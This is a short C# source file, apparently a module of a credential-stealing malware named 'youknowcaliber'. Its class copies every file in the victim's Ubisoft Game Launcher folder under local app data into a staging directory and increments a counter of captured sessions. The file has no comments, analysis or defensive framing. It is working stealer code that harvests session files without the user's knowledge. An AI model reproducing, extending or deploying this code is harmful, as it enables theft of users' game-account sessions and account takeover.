﻿using System;
using System.IO;

namespace youknowcaliber
{
	internal sealed class Uplay
	{
		public static bool GetUplaySession(string sSavePath)
		{
			bool flag = !Directory.Exists(Uplay.path);
			bool result;
			if (flag)
			{
				result = false;
			}
			else
			{
				Directory.CreateDirectory(sSavePath);
				foreach (string sourceFileName in Directory.GetFiles(Uplay.path))
				{
					File.Copy(sourceFileName, Path.Combine(sSavePath, Path.GetFileName(sourceFileName)));
				}
				Counting.Uplay++;
				result = true;
			}
			return result;
		}

		private static string path = Path.Combine(Paths.lappdata, "Ubisoft Game Launcher");
	}
}
